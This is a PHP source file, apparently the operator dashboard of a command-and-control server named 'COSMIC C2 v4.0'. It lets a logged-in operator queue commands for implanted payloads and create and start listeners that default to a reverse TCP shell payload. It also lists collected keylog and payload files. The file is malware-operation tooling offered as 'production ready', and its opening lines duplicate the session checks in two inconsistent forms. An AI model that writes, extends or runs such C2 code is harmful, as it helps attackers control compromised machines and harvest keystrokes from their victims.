<?php session_start(); if (!isset($_SESSION["c2_user"])) { header("Location: login.php"); exit; } ?>
<?php
/**
 * COSMIC C2 v4.0 – SOVEREIGN PRISMATIC INTERFACE (PRODUCTION READY)
 * Professional Command & Control with Authentication, CSRF Protection,
 * Output Escaping, Pagination, and Graceful Error Handling.
 *
 * File: /public/c2-dashboard.php
 */

session_start();
require_once dirname(__DIR__) . '/includes/security_functions.php';
require_once dirname(__DIR__) . '/system/modules/C2Engine.php';

// ==================== AUTHENTICATION ====================
if (!isset($_SESSION['user'])) {
    header('Location: /login.php?redirect=' . urlencode($_SERVER['REQUEST_URI']));
    exit;
}

// ==================== CSRF PROTECTION ====================
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// ==================== INITIALIZE C2 ENGINE ====================
$c2 = new C2Engine();

// ==================== PAGINATION SETTINGS ====================
$page = isset($_GET['page']) ? max(1, (int)$_GET['page']) : 1;
$perPage = 50;
$offset = ($page - 1) * $perPage;

// ==================== HANDLE POST ACTIONS ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    // CSRF check
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die('Invalid CSRF token.');
    }

    try {
        switch ($_POST['action']) {
            case 'add_task':
                if (isset($_POST['payload_uuid'], $_POST['command'])) {
                    $c2->addTask($_POST['payload_uuid'], $_POST['command']);
                    $_SESSION['flash'] = ['type' => 'success', 'message' => 'Task added.'];
                }
                break;
            case 'create_listener':
                if (isset($_POST['name'], $_POST['lhost'], $_POST['lport'])) {
                    $payload_type = $_POST['payload_type'] ?? 'generic/shell_reverse_tcp';
                    $protocol = $_POST['protocol'] ?? 'tcp';
                    $c2->createListener($_POST['name'], $_POST['lhost'], $_POST['lport'], $protocol, $payload_type);
                    $_SESSION['flash'] = ['type' => 'success', 'message' => 'Listener created.'];
                }
                break;
            case 'start_listener':
                if (isset($_POST['listener_id'])) {
                    $c2->startListener((int)$_POST['listener_id']);
                    $_SESSION['flash'] = ['type' => 'success', 'message' => 'Listener started.'];
                }
                break;
            case 'stop_listener':
                if (isset($_POST['listener_id'])) {
                    $c2->stopListener((int)$_POST['listener_id']);
                    $_SESSION['flash'] = ['type' => 'success', 'message' => 'Listener stopped.'];
                }
                break;
            case 'delete_listener':
                if (isset($_POST['listener_id'])) {
                    $c2->deleteListener((int)$_POST['listener_id']);
                    $_SESSION['flash'] = ['type' => 'success', 'message' => 'Listener deleted.'];
                }
                break;
            case 'delete_task':
                if (isset($_POST['task_id'])) {
                    $c2->deleteTask((int)$_POST['task_id']);
                    $_SESSION['flash'] = ['type' => 'success', 'message' => 'Task deleted.'];
                }
                break;
            case 'delete_payload':
                if (isset($_POST['payload_uuid'])) {
                    // Placeholder – implement if needed
                    $_SESSION['flash'] = ['type' => 'warning', 'message' => 'Payload deletion not implemented.'];
                }
                break;
        }
    } catch (Exception $e) {
        log_security_event('C2_ACTION_ERROR', ['action' => $_POST['action'], 'error' => $e->getMessage()]);
        $_SESSION['flash'] = ['type' => 'error', 'message' => 'Action failed: ' . $e->getMessage()];
    }

    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// ==================== FETCH DATA WITH SAFE FALLBACKS ====================
$payloads = method_exists($c2, 'getPayloads') ? $c2->getPayloads(['status' => 'active']) : [];
$listeners = method_exists($c2, 'getListeners') ? $c2->getListeners() : [];
$stats = method_exists($c2, 'getStats') ? $c2->getStats() : [];
$beacons = method_exists($c2, 'getBeacons') ? $c2->getBeacons(null, $perPage, $offset) : [];
$tasks = method_exists($c2, 'getTasks') ? $c2->getTasks(null, null, $perPage, $offset) : [];

// Safe counts – if methods missing, compute manually
$totalBeacons = 0;
if (method_exists($c2, 'getBeaconCount')) {
    $totalBeacons = $c2->getBeaconCount();
} else {
    // Fallback: if we have beacons array, count it
    $totalBeacons = count($beacons);
}

$totalTasks = 0;
if (method_exists($c2, 'getTaskCount')) {
    $totalTasks = $c2->getTaskCount();
} else {
    $totalTasks = count($tasks);
}

// File listings with pagination
$payloadFiles = glob(dirname(__DIR__, 2) . '/data/payloads/*') ?: [];
$keylogFiles = glob(dirname(__DIR__, 2) . '/data/keylogs/*') ?: [];
$advancedPayloads = glob(dirname(__DIR__, 2) . '/data/advanced_payloads/*') ?: [];
$allPayloadFiles = array_merge($payloadFiles, $advancedPayloads);
$totalPayloadFiles = count($allPayloadFiles);
$payloadFilesPage = array_slice($allPayloadFiles, $offset, $perPage);

// C2 Nodes
$nodes = glob(__DIR__ . '/c2/nodes/*', GLOB_ONLYDIR) ?: [];
$nodeList = array_map('basename', $nodes);

// Flash message
$flash = $_SESSION['flash'] ?? null;
unset($_SESSION['flash']);

// Helper for escaping
function e($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

// Determine current view
$view = $_GET['view'] ?? 'dashboard';
?>
